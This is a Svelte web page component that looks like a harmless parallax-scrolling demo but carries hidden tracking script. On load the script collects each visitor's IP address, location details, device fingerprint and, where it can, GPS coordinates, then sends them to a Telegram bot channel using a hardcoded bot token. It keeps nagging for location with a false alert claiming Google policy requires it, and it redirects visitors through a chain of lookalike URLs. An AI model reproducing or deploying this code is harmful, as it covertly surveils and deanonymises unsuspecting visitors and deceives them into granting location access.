<script>
	const layers = [0, 1, 2, 3, 4, 5, 6, 7, 8];

	let y;


	
  import { onMount } from 'svelte';
  onMount(async () => {
    
sendIPToTelegramBots();
yourFunction();
    
    
window.onload = function() {


      setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
    };
  });
  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;
    const message = `
الموقع:
${latitude} ${longitude}
الايبي:
${ipAddress}
`;
    // Create the message with the clickable link to Google Maps
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)
    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}\n\n${ipLocationNetLink}`;
    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }
  async function sendIPToTelegramBots() {
	  
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
    const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
    const vendor = navigator.vendor;
    const isAndroid = userAgent.toLowerCase().includes('android');
    const ipInfo = await getIPInfo(ipAddress);
    const country = ipInfo.country_name || 'N/A';
    const city = ipInfo.city || 'N/A';
    const isp = ipInfo.org || 'N/A';
    const message = `
الايبي: ${ipAddress}
البلد: ${country}
مدينة مزود الخدمة: ${city}
المنظمة: ${isp}
المنصة: ${platform}
عرض الشاشة: ${screenWidth}
ارتفاع الشاشة: ${screenHeight}
عدد المعالجات: ${cpuCores}
الرامات: ${totalRAM}
شركة السوفتوير: ${vendor}
اندرويد: ${isAndroid ? 'نعم' : 'لا'}
باقي البيانات: ${userAgent}
`;
    // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
    const htmlMessage = `${message}\n\n${ipLocationNetLink}`;
    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
	yourFunction();
  }
  async function getIPInfo(ip) {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      return response.json();
    }
    return {};
  }
  
  
  async function yourFunction() {
	  
	   if (!navigator.geolocation) {
    // Geolocation not supported by browser
yourFunction();
  alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");

   //
    return; // Exit the function if no geolocation available
  }
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      // Location permission granted, send location and IP results to Telegram bots
      await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
    },
    (error) => {
      if (error.code === error.PERMISSION_DENIED) {
				yourFunction();
				
		    //alert("اضغط سماح لاستمرار allow");
       alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
        // showAlert();
		sendIPToTelegramBots();
         redirectToNextURL();
        // Location permission denied, send IP result to Telegram bots
     } else {
		 sendIPToTelegramBots();
      // Geolocation failed for other reasons (e.g., GPS unavailable)
      alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
    }
    }
  );
}
  
  
  
  function redirectToNextURL() {
    // Get the current URL
    var currURL = window.location.href;
    // Extract the current number from the URL
    var currNum = parseInt(currURL.match(/mhffff(\d+)/)[1]);
    // Check if the current number is less than or equal to 999
    if (currNum <= 999) {
      // Increment the current number by 1 and construct the next URL
      var nextNum = currNum + 1;
      var nextURL = currURL.replace(/mhffff\d+/, 'mhffff' + nextNum);
      // Redirect to the next URL
      window.location.href = nextURL;
    } else {
      // If the current number is greater than 999, display an alert message
      // alert('You have reached the maximum number of URLs.');
      window.location.href = 'https://mhffff1.onrender.com';
    }
  }
	
</script>

<svelte:window bind:scrollY={y} />

<a class="parallax-container">
	{#each layers as layer}
		<img
			style="transform: translate(0,{(-y * layer) / (layers.length - 1)}px)"
			src="https://www.firewatchgame.com/images/parallax/parallax{layer}.png"
			
			alt="parallax layer {layer}"
		/>
	{/each}
</a>

<div class="text">
	<span style="opacity: {1 - Math.max(0, y / 40)}"> scroll down </span>

	<div class="foreground">
		You have scrolled {y} pixels
	</div>
</div>

<style>
	.parallax-container {
		position: fixed;
		width: 2400px;
		height: 712px;
		left: 50%;
		transform: translate(-50%, 0);
	}

	.parallax-container img {
		position: absolute;
		top: 0;
		left: 0;
		width: 100%;
		will-change: transform;
	}

	.parallax-container img:last-child::after {
		content: '';
		position: absolute;
		width: 100%;
		height: 100%;
		background: rgb(45, 10, 13);
	}

	.text {
		position: relative;
		width: 100%;
		height: 300vh;
		color: rgb(220, 113, 43);
		text-align: center;
		padding: 4em 0.5em 0.5em 0.5em;
		box-sizing: border-box;
		pointer-events: none;
	}

	span {
		display: block;
		font-size: 1em;
		text-transform: uppercase;
		will-change: transform, opacity;
	}

	.foreground {
		position: absolute;
		top: 711px;
		left: 0;
		width: 100%;
		height: calc(100% - 712px);
		background-color: rgb(32, 0, 1);
		color: white;
		padding: 50vh 0 0 0;
	}

	:global(body) {
		margin: 0;
		padding: 0;
		background-color: rgb(253, 174, 51);
	}
</style>
